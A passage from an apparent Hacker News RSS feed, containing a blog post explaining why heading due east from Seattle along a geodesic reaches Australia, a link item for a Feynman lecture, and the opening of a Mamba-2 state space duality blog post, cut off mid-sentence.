    Contents
    <span> (click to toggle)</span>
  </summary>
  <nav>
        <ol><li><a href="#reaching-the-answer">Reaching the answer</a></li><li><a href="#appendix%3A-geodesics">Appendix: geodesics</a></li></ol>
      </nav>
  <p>1,455 words • 8 min read</p>
</details>


 <p>Here’s a <a href="https://twitter.com/finmoorhouse/status/1744059290120245347">puzzle</a>:</p>
<p>Imagine you begin a journey in Seattle WA, facing exactly due east. Then start traveling forward, in a straight line along the Earth’s surface.</p>
<p>You will travel across North America, and onto the Atlantic Ocean. Eventually, you will hit another country.</p>
<p>The question is: <em>what is the first country you hit?</em></p>
<p>The image below shows your starting direction. The rest of this post discusses the answer, so here’s your opportunity to make a guess of your own.</p>
<figure><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/C7qFxvgLog-800.avif 800w, https://finmoorhouse.com/img/C7qFxvgLog-1600.avif 1600w, https://finmoorhouse.com/img/C7qFxvgLog-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/C7qFxvgLog-800.jpeg 800w, https://finmoorhouse.com/img/C7qFxvgLog-1600.jpeg 1600w, https://finmoorhouse.com/img/C7qFxvgLog-2000.jpeg 2000w" sizes="100vw"><img alt="The starting point" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/C7qFxvgLog-800.jpeg" width="2000" height="1333"></picture><figcaption>Your starting point and direction.</figcaption></figure>
<hr>
<details><summary>Click me to <strong>reveal the answer</strong></summary><hr><strong>Australia</strong>. After pointing due east, and traveling continually forward in a straight line across the Earth’s surface, the next country you hit after you leave North America is Australia.
<p>And here is the path you take (<a href="https://images.finmoorhouse.com/writing/go-east/mercator-path.png">high res version</a>)<sup><a href="#fn1" id="fnref1">[1]</a></sup>:</p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/4sg_hNPjs2-800.avif 800w, https://finmoorhouse.com/img/4sg_hNPjs2-1600.avif 1600w, https://finmoorhouse.com/img/4sg_hNPjs2-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/4sg_hNPjs2-800.jpeg 800w, https://finmoorhouse.com/img/4sg_hNPjs2-1600.jpeg 1600w, https://finmoorhouse.com/img/4sg_hNPjs2-2000.jpeg 2000w" sizes="100vw"><img alt="The path taken, on Mercator projection" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/4sg_hNPjs2-800.jpeg" width="2000" height="1054"></picture></p>
</details>
<hr>
<h3 id="reaching-the-answer" tabindex="-1"><a href="#reaching-the-answer">Reaching the answer</a></h3>
<p>Forget about the Earth for a second, and just imagine you’re standing on a big sphere.</p>
<p>Point in <em>any</em> direction, and begin walking forward along the surface of the sphere, without changing direction. This, I think, is the fairest interpretation of ‘straight line’.</p>
<p>Of course, you’ll loop round and return to where you started.</p>
<figure><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/s48nwx1oeU-800.avif 800w, https://finmoorhouse.com/img/s48nwx1oeU-1600.avif 1600w, https://finmoorhouse.com/img/s48nwx1oeU-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/s48nwx1oeU-800.jpeg 800w, https://finmoorhouse.com/img/s48nwx1oeU-1600.jpeg 1600w, https://finmoorhouse.com/img/s48nwx1oeU-2000.jpeg 2000w" sizes="100vw"><img alt="The most obvious interpretation of 'straight line'" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/s48nwx1oeU-800.jpeg" width="2000" height="1734"></picture><figcaption>The most obvious interpretation of 'straight line'</figcaption></figure>
<p>Notice also, just intuitively, how you’ll have walked the full circumference of the sphere: a ‘<a href="https://en.wikipedia.org/wiki/Great_circle">great circle</a>’.</p>
<p>In order to trace out a smaller circle than that, you’d need to be constantly veering left or right.</p>
<p>In the original puzzle, you might have been imagining traveling a line of constant latitude — that is, <em>always</em> heading east.</p>
<p>But that is <em>not</em> a great circle, and so not a straight line: you’d need to be constantly turning left to maintain that path. Travelling laterally means changing direction with respect to the Earth’s surface.</p>
<figure><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/5rb5Vvf6Nn-800.avif 800w, https://finmoorhouse.com/img/5rb5Vvf6Nn-1600.avif 1600w, https://finmoorhouse.com/img/5rb5Vvf6Nn-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/5rb5Vvf6Nn-800.jpeg 800w, https://finmoorhouse.com/img/5rb5Vvf6Nn-1600.jpeg 1600w, https://finmoorhouse.com/img/5rb5Vvf6Nn-2000.jpeg 2000w" sizes="100vw"><img alt="A line of constant latitude" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/5rb5Vvf6Nn-800.jpeg" width="2000" height="1508"></picture><figcaption>A line of constant latitude</figcaption></figure>
<p>To give an extreme example: imagine driving in a 10 meter radius around the North Pole. In order to always be traveling east — maintaining the same latitude — you’d need to be steering left the whole time.</p>
<p>Here’s a better perspective: looking at Seattle centered on a globe, any straight line from Seattle will look like a straight line to you.</p>
<p>So with north pointing directly up, the path you take is a straight line directly to the right.</p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/a1jTgLDGbb-800.avif 800w, https://finmoorhouse.com/img/a1jTgLDGbb-1600.avif 1600w, https://finmoorhouse.com/img/a1jTgLDGbb-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/a1jTgLDGbb-800.jpeg 800w, https://finmoorhouse.com/img/a1jTgLDGbb-1600.jpeg 1600w, https://finmoorhouse.com/img/a1jTgLDGbb-2000.jpeg 2000w" sizes="100vw"><img alt="The starting point" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/a1jTgLDGbb-800.jpeg" width="2000" height="1734"></picture></p>
<p>Being a great circle, exactly half of the path you travel is in the Northern Hemisphere, and half in the Southern Hemisphere. It swoops under Africa to arrive at Australia somewhere near Perth<sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/Wqmul5ksaK-800.avif 800w, https://finmoorhouse.com/img/Wqmul5ksaK-1600.avif 1600w, https://finmoorhouse.com/img/Wqmul5ksaK-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/Wqmul5ksaK-800.jpeg 800w, https://finmoorhouse.com/img/Wqmul5ksaK-1600.jpeg 1600w, https://finmoorhouse.com/img/Wqmul5ksaK-2000.jpeg 2000w" sizes="100vw"><img alt="Arriving at Australia" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/Wqmul5ksaK-800.jpeg" width="2000" height="1734"></picture></p>
<p>One way to see this would be to pin a string to Seattle on a globe, and stretch it taut over the globe. Every path from Seattle to wherever you stretch the string is a geodesic; being the shortest line on the surface of the globe to that point. Now stretch the string so that it emerges from Seattle going east: you’ll see it avoids land until Australia.</p>
<p>Of course, part of the trickiness here is that straight lines on the Earth are not straight lines on most 2D projections of the Earth (maps), and vice-versa.</p>
<p>That’s why the shortest flight path between two cities often looks unnecessarily curved on a map, such as the map you see on an airplane.</p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/kFAOw8rbHI-800.avif 800w" sizes="100vw"><img alt="A flight path, orthographic projection" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/kFAOw8rbHI-800.jpeg" width="800" height="485"></picture></p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/2UdmwxBunY-800.avif 800w" sizes="100vw"><img alt="A flight path, Mercator projection" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/2UdmwxBunY-800.jpeg" width="800" height="496"></picture></p>
<p>But there are some exceptions. Any straight line on a ‘<a href="https://en.wikipedia.org/wiki/Gnomonic_projection">gnomonic projection</a>’ (pictured) is an arc of a great circle (straight line) on a sphere. <a href="https://images.finmoorhouse.com/writing/go-east/gnomonic.png">Here’s a link</a> to a full-res version of the image below.</p>
<p><picture><source type="image/avif" srcset="https://finmoorhouse.com/img/DABhBPj09b-800.avif 800w, https://finmoorhouse.com/img/DABhBPj09b-1600.avif 1600w, https://finmoorhouse.com/img/DABhBPj09b-2000.avif 2000w" sizes="100vw"><source type="image/jpeg" srcset="https://finmoorhouse.com/img/DABhBPj09b-800.jpeg 800w, https://finmoorhouse.com/img/DABhBPj09b-1600.jpeg 1600w, https://finmoorhouse.com/img/DABhBPj09b-2000.jpeg 2000w" sizes="100vw"><img alt="The starting point" loading="lazy" decoding="async" src="https://finmoorhouse.com/img/DABhBPj09b-800.jpeg" width="2000" height="1333"></picture></p>
<p>But how natural to think a straight line on a more familiar map is a straight line on the surface of the Earth! And so, how natural to answer “France” over “Australia”.</p>
<p>I love this puzzle. Great puzzles are crafted to evoke a flash of insight, after which the answer is both clear and surprising compared to the intuitive answer. This one fits the bill. Poor puzzles feel arbitrary or like cheap tricks; they are to good puzzles as Christmas cracker puns are to good jokes.</p>
<p>I first saw it on <a href="https://www.tiktok.com/@marcbreathes?lang=en">Marc Ordower’s excellent TikTok page</a>, of all places. Check it out.</p>
<h3 id="appendix%3A-geodesics" tabindex="-1"><a href="#appendix%3A-geodesics">Appendix: geodesics</a></h3>
<p>To be pedantic, by ‘straight line’ here I really mean ‘<a href="https://en.wikipedia.org/wiki/Geodesic">geodesic</a>’ — the generalisation of ‘straight line’ for curved surfaces and space as well as ‘flat’, <a href="https://en.wikipedia.org/wiki/Euclidean_space">Euclidian</a> spaces.</p>
<p>A geodesic is just the shortest path between two points in a surface. If you’re placed on a surface and continually walk “forward”, by definition <a href="https://en.wikipedia.org/wiki/Geodesic#/media/File:Insect_on_a_torus_tracing_out_a_non-trivial_geodesic.gif">you will trace out a geodesic</a>.</p>
<p>Some people replying to my <a href="https://twitter.com/finmoorhouse/status/1744059290120245347">original tweet</a> pointed out that a straight line from the original point and direction would take you into space. This is true if we’re talking about a straight line in <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="double-struck">E</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">\mathbb{E}^3</annotation></semantics></math></span></span> (3D Euclidian space). But in the original question, I say “start traveling forward, in a straight line <strong>along the Earth’s surface</strong>”. So I think it’s clear we’re talking about a straight line along a <em>surface</em>, which is not the same as 3D space. We’re talking about <a href="https://en.wikipedia.org/wiki/Geodesics_on_an_ellipsoid">geodesics on a sphere</a>.</p>
<p>But I admit that “straight line” is not exactly well-defined on curved surfaces. I’m saying “geodesic = straight line”, but someone pointed out to me a different interpretation: “<a href="https://en.wikipedia.org/wiki/Line_(geometry)">straight line</a>” <em>is</em> well-defined for Euclidian spaces, including the Euclidian plane (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="double-struck">E</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\mathbb{E}^2</annotation></semantics></math></span></span>). So we can say a geodesic (or any other path) is straight <em>just</em> when the <a href="https://mathoverflow.net/questions/294650/when-are-geodesics-straight-lines">associated projective connection is flat</a>, in our case when the projection of the line on the globe onto <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="double-struck">E</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\mathbb{E}^2</annotation></semantics></math></span></span> — that is, a 2D map — is straight. And that would mean that whether a path across Earth counts as ‘straight’ depends on the projection, and on popular projections (such as the <a href="https://en.wikipedia.org/wiki/Mercator_projection">Mercator projection</a>), lateral paths <em>would</em> count, despite being <a href="https://en.wikipedia.org/wiki/Darboux_frame#Geodesic_curvature,_normal_curvature,_and_relative_torsion">intrinsically curved</a>.</p>
<p>So maybe half a point for “France” if that’s what went through your head. Still I think “just go straight forward and don’t change direction” is the more natural reading.</p>
<hr>
<section>
<ol>
<li id="fn1"><p>I made these graphics mostly using the <code>basemap</code> <a href="https://matplotlib.org/basemap/stable/">Python package</a>. It’s nicely put together and documented. <a href="#fnref1">↩︎</a></p>
</li>
<li id="fn2"><p>Does it matter that the Earth is not a perfect sphere? It does not. It turns out the Earth is very roughly an <a href="https://en.wikipedia.org/wiki/Figure_of_the_Earth#Ellipsoid_of_revolution">‘oblate spheroid’</a>: the kind of shape you get by rotating an ellipse about its shorter axis. <a href="https://upload.wikimedia.org/wikipedia/commons/6/69/Earth2014shape_SouthAmerica_small.jpg">Here’s a coloured view</a> of Earth’s surface height relative to its centre, as opposed to mean sea level. But Earth is only about 0.3% shorter from pole to pole compared to if it where a sphere, which is not enough to change the answer. <a href="#fnref2">↩︎</a></p>
</li>
</ol>
</section>


<br>

<br>

    <a href="https://finmoorhouse.com/writing">
      <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="white" viewBox="0 0 256 256">
        <rect width="256" height="256" fill="none"></rect>
        <polyline points="160 208 80 128 160 48" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="24"></polyline>
      </svg>
      <span>Back to writing</span>
    </a>


    
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Feynman Computer Science Lecture – Hardware, Software, Heuristics (1985) [video] (106 pts)]]></title>
            <link>https://www.youtube.com/watch?v=EKWGGDXe5MA</link>
            <guid>40564079</guid>
            <pubDate>Mon, 03 Jun 2024 16:07:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=EKWGGDXe5MA">https://www.youtube.com/watch?v=EKWGGDXe5MA</a>, See on <a href="https://news.ycombinator.com/item?id=40564079">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Mamba-2 – State Space Duality (141 pts)]]></title>
            <link>https://tridao.me/blog/2024/mamba2-part1-model/</link>
            <guid>40564067</guid>
            <pubDate>Mon, 03 Jun 2024 16:07:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tridao.me/blog/2024/mamba2-part1-model/">https://tridao.me/blog/2024/mamba2-part1-model/</a>, See on <a href="https://news.ycombinator.com/item?id=40564067">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <d-contents> <nav> <h3>Contents</h3>  <ul> <li> <a href="#the-linear-ssm-mode">The Linear (SSM) Mode</a> </li> <li> <a href="#the-quadratic-attention-mode">The Quadratic (Attention) Mode</a> </li> </ul>  <ul> <li> <a href="#ssd-vs-state-space-models">SSD vs. State Space Models</a> </li> <li> <a href="#ssd-vs-attention">SSD vs. Attention</a> </li> </ul>   </nav> </d-contents> <figure> <picture> <source srcset="https://tridao.me/assets/img/2024-05-31-mamba-2/mamba-2-V3-transparent-480.webp 480w,https://tridao.me/assets/img/2024-05-31-mamba-2/mamba-2-V3-transparent-800.webp 800w,https://tridao.me/assets/img/2024-05-31-mamba-2/mamba-2-V3-transparent-1400.webp 1400w," sizes="95vw" type="image/webp"> <img src="https://tridao.me/assets/img/2024-05-31-mamba-2/mamba-2-V3-transparent.png" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>[<a href="https://arxiv.org/abs/2405.21060" rel="external nofollow noopener" target="_blank">Paper</a>] [<a href="https://github.com/state-spaces/mamba" rel="external nofollow noopener" target="_blank">Code</a>]</p> <ol> <li>Part I - The Model</li> <li><a href="https://tridao.me/blog/2024/mamba2-part2-theory/">Part II - The Theory</a></li> <li><a href="https://tridao.me/blog/2024/mamba2-part3-algorithm/">Part III - The Algorithm</a></li> <li><a href="https://tridao.me/blog/2024/mamba2-part4-systems/">Part IV - The Systems</a></li> </ol> <p>Since the release of <a href="https://arxiv.org/abs/2312.00752" rel="external nofollow noopener" target="_blank">Mamba</a> 6 months ago, we’ve been pleasantly surprised by the overwhelming <a href="https://github.com/AvivBick/awesome-ssm-ml" rel="external nofollow noopener" target="_blank">community response</a>. It’s been incredibly gratifying to see the line of research on efficient sequence models we’ve been pursuing for years really resonate with the machine learning community and take off more than we could have anticipated. We’ve seen an enormous amount of exciting follow-up work, from direct applications (e.g. vision <d-cite key="zhu2024vision"></d-cite><d-cite key="ma2024u"></d-cite><d-cite key="liu2024vmamba"></d-cite>, genomics <d-cite key="schiff2024caduceus"></d-cite>, graphs <d-cite key="wang2024graph"></d-cite><d-cite key="behrouz2024graph"></d-cite>, and more) to understanding (e.g. on recall abilities <d-cite key="jelassi2024repeat"></d-cite>, in-context learning<d-cite key="akyurek2024context"></d-cite> <d-cite key="grazzi2024mamba"></d-cite> <d-cite key="park2024can"></d-cite>, and formal language expressivity <d-cite key="merrill2024illusion"></d-cite><d-cite key="sarrof2024expressive"></d-cite>), and an enormous number of <a href="https://jackcook.com/2024/02/23/mamba.html" rel="external nofollow noopener" target="_blank">online</a> <a href="https://srush.github.io/annotated-mamba/hard.html" rel="external nofollow noopener" target="_blank">blogs</a>, <a href="https://www.youtube.com/watch?v=dVH1dRoMPBc" rel="external nofollow noopener" target="_blank">tutorials</a>, <a href="https://www.youtube.com/watch?v=8Q_tqwpTpVU" rel="external nofollow noopener" target="_blank">and</a> <a href="https://www.youtube.com/watch?v=N6Piou4oYx8" rel="external nofollow noopener" target="_blank">videos</a>. We couldn’t be more excited about the direction of this research!</p> <p>Yet despite its potential so far, we weren’t completely satisfied with the first version of Mamba…</p> <h3 id="problem-1-understanding">Problem 1 (Understanding)</h3> <p>From a conceptual standpoint, one of the reasons we found SSMs so fascinating is how they just feel <em>fundamental</em>. One way this is exemplified is how they have rich ties to many major paradigms of sequence models. As developed in our earlier works on structured SSMs <d-cite key="gu2021combining"></d-cite><d-cite key="gu2023thesis"></d-cite>, they seem to capture the essence of continuous, convolutional, and recurrent sequence models – all wrapped up in a simple and elegant model.</p> <p>But of course, aside from these, there’s another major sequence model paradigm: variants of the ubiquitous <strong>attention</strong> mechanism<d-cite key="bahdanau2015neural"></d-cite><d-cite key="vaswani2017attention"></d-cite>. SSMs always felt somewhat disjoint from attention, and we’ve tried for a while to understand their relationship better.</p> <blockquote> <p>Question 1: <strong>What are the conceptual connections between state space models and attention?</strong> Can we combine them?</p> </blockquote> <h3 id="problem-2-efficiency">Problem 2 (Efficiency)</h3> <p>From a computational standpoint, despite the work that went into making Mamba fast (in particular, its hardware-aware selective scan implementation) it’s still much less hardware-efficient than mechanisms such as attention. The missing piece is that modern accelerators such as GPUs and TPUs are <em>highly</em> specialized for matrix multiplications. While this isn’t a problem for inference, which is bottlenecked by somewhat different considerations, this can be a big deal during training time.</p> <blockquote> <p>Question 2: <strong>Can we speed up the training of Mamba models by recasting them as matrix multiplications?</strong></p> </blockquote> <p>These are the main questions that Mamba-2 – in particular, its new state space model variant – tries to address.</p> <h2 id="the-ssd-model">The SSD Model</h2> <p>The main point of the Mamba-2 paper is what we call <strong>structured state space duality</strong> (SSD), which refers to several things:</p> <ol> <li>The <strong>SSD model</strong> refers to a specific standalone layer, like attention or an SSM, that can be incorporated into deep neural networks</li> <li>The <strong>SSD framework</strong> is a general framework for reasoning about this model (and many more theoretical connections)</li> <li>The <strong>SSD algorithm</strong> is an algorithm for computing SSD layers much more efficiently than previous SSMs</li> </ol> <p>The main SSD model or “state space dual model” itself really isn’t so complicated! In this first part of a series of blog posts, we’ll provide a self-contained description of the SSD layer (and Mamba-2) in isolation and how it compares to related models, particularly Mamba-1.</p> <p>In the next parts of this series, we’ll describe the general framework and theoretical connections, which aren’t necessary to actually use Mamba-2.</p> <h3 id="the-linear-ssm-mode">The Linear (SSM) Mode</h3> <p>SSD starts from the same set of equations as Mamba:</p> \[\begin{aligned} h_{t} &amp;= A_t h_{t-1} + B_t x_t \\ y_t &amp;= C_t^{\top} y_t \end{aligned}\] <p>\begin{equation} \label{eq:ssm} (\text{Selective state space model (SSM)}) \end{equation}</p> <p>To recap, a <strong>structured state space model (SSM)</strong> <d-cite key="gu2022efficiently"></d-cite><d-cite key="gu2023thesis"></d-cite> defines a map from $x \in \mathbb{R}^\mathtt{T} \to y \in \mathbb{R}^\mathtt{T}$. Think of $x_t$ and $y_t$ as being scalars, and the hidden state $h_t$ as an $\mathtt{N}$-dimensional vector, where $\mathtt{N}$ is an independent hyperparameter called the <em>state size, state dimension, or state expansion factor</em>.</p> <p>A <em>selective</em> state space model allows the $(A, B, C)$ SSM parameters to vary across time <d-cite key="gu2023mamba"></d-cite>. We’ll think of them as tensors with shapes $A \in \mathbb{R}^\mathtt{(T, N, N)}$, $B \in \mathbb{R}^\mathtt{(T, N)}$, and $C \in \mathbb{R}^\mathtt{(T, N)}$ respectively.<d-footnote>As with Mamba-1, we take everything over the reals $\mathbb{R}$, although complex variants as with other structured SSMs like the S4 lineage <d-cite key="gu2022efficiently"></d-cite> are also possible.</d-footnote></p> <p>Structured SSMs require $A$ to have structure to be efficiently computable, such as the most commonly used diagonal structure <d-cite key="gu2022parameterization"></d-cite><d-cite key="gupta2022diagonal"></d-cite><d-cite key="smith2023s5"></d-cite><d-cite key="gupta2022simplifying"></d-cite>. In this case $A$ has shape $\mathtt{(T, N)}$ where only the diagonal elements of the $\mathtt{N} \times \mathtt{N}$ matrices are stored.</p> <h4 id="ssd-scalar-structured-ssm">SSD: Scalar Structured SSM</h4> <p>The original Mamba (or more precisely its core “S6” layer) is exactly a selective SSM with diagonal structure.</p> <p><strong>The SSD layer of Mamba-2 makes only one small modification</strong>: it restricts the diagonal $A$ even further to a <em>scalar times identity</em> structure; in other words the diagonal elements of $A$ must all be the same value. In this case $A$ can be represented with shape just $\mathtt{(T)}$ and one can also identify $A_t$ as just a scalar (and so we’ll sometimes denote it $a_t$).</p> <h4 id="multihead-ssms">Multihead SSMs</h4> <p>Equation \eqref{eq:ssm} is defined only for a single dimensional input $x \in \mathbb{R}^\mathtt{T}$. If $X \in \mathbb{R}^\mathtt{(T, P)}$ has $\mathtt{P}$ separate channels, we can use the same dynamics (i.e. the same SSM $(A, B, C)$) independently for each channel. This can be interpreted as a <em>single head</em> of the SSM model.</p> <p>Here, we think of $X$ as a tensor of shape $\mathtt{(T, P)}$ where $\mathtt{T}$ is the sequence (time) dimension and $\mathtt{P}$ is the “head dimension”.<d-footnote>Normally there's an additional batch dimension $\mathtt{B}$ when implementing these models, which we'll ignore throughout this presentation.</d-footnote></p> <p>Multiple heads can be constructed completely independently; for the remainder of this post, we assume that we’re working with a single head. Note that these heads are exactly analogous to how heads in multi-head attention models work, and in Mamba-2 we also choose similar dimensions as modern Transformers, e.g. $\mathtt{P} = 64$ or $\mathtt{P}=128$. (To scale to larger model widths $\mathtt{D} = \mathtt{d\_model}$, we keep this fixed and increase the number of independent heads.)</p> <p>We can notate the general (selective) state space model as \begin{equation} \label{eq:ssm-transformation} Y^\mathtt{(T,P)} = \mathsf{SSM}(A^\mathtt{(T,…)}, B^\mathtt{(T,N)}, C^\mathtt{(T,N)})(X^\mathtt{(T,P)}) \end{equation}</p> <p>Some axes of variation include</p> <ol> <li>The structure on $A$, which affects its parameter shape, e.g. <code>... = (N)</code> for diagonal SSMs, or <code>... = ()</code> for scalar SSMs (i.e. SSD)</li> <li>The state dimension $\mathtt{N}$ (i.e. <code>d_state</code>)</li> <li>The head dimension $\mathtt{P}$ (i.e. <code>d_head</code>)</li> </ol> <p>There are other axes of variation of structured SSMs (e.g. time-invariance vs. selectivity, SISO vs. MIMO<d-cite key="smith2023s5"></d-cite>, real vs. complex, etc.), but we’re highlighting these so that we can contrast Mamba-2 to Mamba-1 in just a second…</p> <h3 id="the-quadratic-attention-mode">The Quadratic (Attention) Mode</h3> <p>But first, let’s switch tacks and forget about state space models for a moment. Given the same tensors above with the same shapes $(A^\mathtt{(T)}, B^\mathtt{(T, N)}, C^\mathtt{(T, N)})$, let’s define a different object.</p> <p>First, we’ll define the following matrix (don’t worry, we’ll explain more and give it a name in Part II of this series!)</p> \[L = \begin{bmatrix} 1 &amp; \\ a_1 &amp; 1 &amp; \\ a_2a_1 &amp; a_2 &amp; 1 \\ \vdots &amp; \vdots &amp; \ddots &amp; \ddots \\ a_{\mathtt{T}-1}\dots a_1 &amp; a_{\mathtt{T}-1}\dots a_2 &amp; \dots &amp; a_{\mathtt{T}-1} &amp; 1 \\ \end{bmatrix} .\] <p>Then, let’s define the following matrix</p> <p>\begin{equation} \label{eq:ssd-attention} M = L \circ C B^\top \in \mathbb{R}^{\mathtt{(T,T)}} \end{equation}</p> <p>Finally, $M$ encodes a <em>sequence transformation</em> $x \in \mathbb{R}^\mathtt{T} \to y \in \mathbb{R}^\mathtt{T}$ mapping a 1D input to a 1D output—just as in equation \eqref{eq:ssm}—through basic matrix multiplication $y = Mx$.</p> <p>What’s special about this? Well, you may notice that it looks very similar to an attention computation. In fact, if all $a_t = 1$, then $L$ is simply the lower-triangular <em>causal mask</em> and \ref{eq:ssd-attention} is exactly <strong>causal linear attention</strong> <d-cite key="katharopoulos2020transformers"></d-cite>:</p> \[Y = (L \circ Q K^\top) V\] <p>This is exactly the same as equation \eqref{eq:ssd-attention} if we rename $(C, B, X) \mapsto (Q, K, V)$!</p> <h2 id="state-space-duality">State Space Duality</h2> <p>The so-called “duality” refers to the fact that the two models defined in equations \eqref{eq:ssm} (for the scalar-identity structured $A_t$ case) and \eqref{eq:ssd-attention} are actually <em>exactly the same model</em>, which we can view as a particular function</p> \[(A^\mathtt{(T)}, B^\mathtt{(T, N)}, C^\mathtt{(T, N)}, X^\mathtt{(T, P)}) \mapsto Y^\mathtt{(T, P)}\] <p>In the general <em>SSD Framework</em> (Part II of this series), we’ll show this equivalence in two completely different ways, both of which are actually much more general and each quite illuminating.</p> <p>If you take our word for it, though, then SSD is relatively simple to contrast in relation to either SSMs or attention.</p> <h3 id="ssd-vs-state-space-models">SSD vs. State Space Models</h3> <p>Compared to previous SSMs, SSD is pretty much the same as the core layer of Mamba but with even more structure on the recurrent $A$ matrices.</p> <ol> <li>Mamba-1 (S6) uses diagonal structure on $A$, while Mamba-2 (SSD) uses scalar-times-identity structure on $A$.</li> <li>Mamba-1 has a head dimension of $\mathtt{P}=1$ (i.e. all channels are completely independently controlled by separate SSMs), while Mamba-2 uses a head dimension of $\mathtt{P}&gt;1$ (something like $\mathtt{P}=64$ by default).</li> </ol> <p>In particular, this can be viewed as weight-tied in two ways:</p> <ul> <li>By restricting the diagonal structure of $A$ to scalar-times-identity, the recurrence dynamics are shared across all $\mathtt{N}$ elements of the state space.</li> <li>These dynamics are also shared across all $\mathtt{P}$ channels of a given head.</li> </ul> <p>In other words, a single SSM head has total state size $\mathtt{P} \times \mathtt{N}$, which are each governed by separate scalar recurrences in Mamba-1 but are controlled by a single shared recurrence in Mamba-2.</p> <p>Why make these restrictions? The main motivation is efficiency: these changes are necessary to be able to view the model in its [<a href="#the-quadratic-attention-mode">dual attention form</a>], which allows matrix multiplications to be used.</p> <blockquote> <h4 id="the-bottom-line-mamba-1-vs-mamba-2">The Bottom Line: Mamba-1 vs. Mamba-2</h4> <p>Compared to Mamba-1, Mamba-2 allows <strong>much larger state dimensions</strong> (from <code>N=16</code> in Mamba-1 to <code>N=64</code> to <code>N=256</code> or even higher in Mamba-2) while simultaneously being <strong>much faster during training</strong>.</p> </blockquote> <p>But can this hurt us? There’s some intuition to believe that it shouldn’t. One of the main reasons for the selectivity (e.g. $A$ that depends on the input $X$) introduced in Mamba is to let the SSM be able to control whether to remember or ignore particular pieces of information; for example, if a filler “um” is encountered in a text transcript. But if such information should be ignored, then the entire state can ignore it together, and so it should be okay if the state’s dynamics are shared across all features.</p> <p>Empirically, we haven’t found evidence that the restricted expressivity of Mamba-2 might hurt, but the jury’s still out! From one perspective, Mamba-2 isn’t <em>strictly</em> better than Mamba-1: while it’s a dramatic improvement from a <em>training</em> perspective, Mamba-1 might be better from a pure <em>inference</em> perspective. Since inference speed of SSMs is entirely governed by the state dimension, if one wants to maximize performance for a target inference efficiency (i.e. for a particular state size $\mathtt{N}$), then the increased expressivity of Mamba-1 might be better. We haven’t fully analyzed the (theoretical or empirical) tradeoffs here, and think this would be a cool direction for the community to dig in more!</p> <h3 id="ssd-vs-attention">SSD vs. Attention</h3> <p>Compared, to standard (self-)attention, SSD also only has two differences:</p> <ol> <li>The softmax normalization is dropped.</li> <li>A separate elementwise mask matrix is applied multiplicatively.</li> </ol> <p>The first difference can be interpreted as what reduces the effective state size of the model from linear to constant, and improves its efficiency from quadratic to linear.</p> <p>The second difference is what distinguishes SSD from standard linear attention. One way to think of the mask is as <strong>input-dependent relative positional encodings</strong>. Because of the mask $L$ in \eqref{eq:ssd-attention}, the standard attention score $Q_i K_j$ is attenuated by a weight $a_{i:j}^\times = a_i \cdots a_{j+1}$ which can be interpreted as a “discount factor” based on how far apart the positions $i$ and $j$ are.<d-footnote>This interpretation was concurrently espoused by Tobias Katsch's [GateLoop](https://arxiv.org/abs/2311.01927) paper<d-cite key="katsch2023gateloop"></d-cite></d-footnote> In its attention form, this input-dependent positional mask can be interpreted as the key factor that encodes the “selectivity” of Mamba!</p> <h2 id="best-of-both-worlds">Best of Both Worlds</h2> <p>So why do we care that there are two views of this model? Well, first of all, it’s extremely mathematically interesting, as we’ll cover in <a href="https://tridao.me/blog/2024/mamba2-part2-theory/">Part 2</a>, and we hope will inspire future directions. But there are immediate practical benefits too!</p> <h3 id="efficiency-the-ssm-and-attention-modes">Efficiency: the SSM and Attention Modes</h3> <p>The SSM \eqref{eq:ssm} and attention \eqref{eq:ssd-attention} modes represent two different ways of computing the same function, so let’s contrast them.</p> <p>First, remember that one main reason why SSMs are interesting to begin with is because computing \eqref{eq:ssm} as a recurrence requires maintaining a <em>constant-size state</em> (size $\mathtt{N}$ per channel) and scales <em>linearly in the sequence length</em> $\mathtt{T}$. The downside is that the raw FLOPs don’t reflect actual speed in practice because of hardware considerations…</p> <p>On the other hand, computing this sequence transformation $y = Mx$ through equation \eqref{eq:ssd-attention} takes quadratic time in the sequence length, because we’re materializing this $\mathtt{T} \times \mathtt{T}$ matrix. But it can be fast in practice 